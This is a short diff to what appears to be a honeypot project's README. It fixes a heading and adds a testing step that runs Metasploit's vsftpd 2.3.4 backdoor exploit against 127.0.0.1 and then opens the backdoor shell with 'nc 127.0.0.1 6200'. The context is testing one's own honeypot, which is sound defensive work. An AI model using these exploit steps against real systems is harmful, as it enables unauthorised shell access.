@@ -52,7 +52,7 @@ docker run -it --rm \
 ```
 ---
 
-### Methode 2
+### Methode 2:
 
 Start the honeypot (requires root privileges):
 ```bash
@@ -181,6 +181,10 @@ msfconsole -q
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 127.0.0.1
 run
+```
+intrept it with ctrl+c
+
+```bash
 nc 127.0.0.1 6200
 ```
 
